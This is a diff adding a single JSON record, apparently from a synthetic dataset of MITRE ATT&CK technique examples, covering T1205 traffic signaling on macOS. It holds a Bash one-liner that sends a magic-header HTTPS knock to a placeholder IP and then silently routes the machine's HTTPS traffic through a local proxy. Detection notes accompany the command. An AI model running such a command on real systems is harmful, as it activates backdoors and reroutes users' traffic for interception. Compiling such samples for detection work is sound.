@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl -s -H 'X-Trigger: 1337' https://203.0.113.10:8443/knock && networksetup -setsecurewebproxy \"Wi-Fi\" 127.0.0.1 8443 && networksetup -setsecurewebproxystate \"Wi-Fi\" on",
+  "explanation": "Uses an application-layer magic header over HTTPS as a covert signal to a listener, then switches the system to route HTTPS through a local proxy. Detection: inspect for non-standard headers to odd endpoints and watch for sudden enablement of secure web proxy settings.",
+  "rationale_steps": [
+    "Issue an HTTPS request bearing a magic header that a backdoor monitors for activation.",
+    "Upon acknowledgment, configure the secure web proxy to a local port for controlled egress.",
+    "Detect via web proxy/firewall logs for unusual header patterns and monitor secure proxy state changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-d65eb033-b3f98834",
+  "source_prompt_hash": "d65eb033",
+  "timestamp_utc": "2025-09-30T06:10:08.592373Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
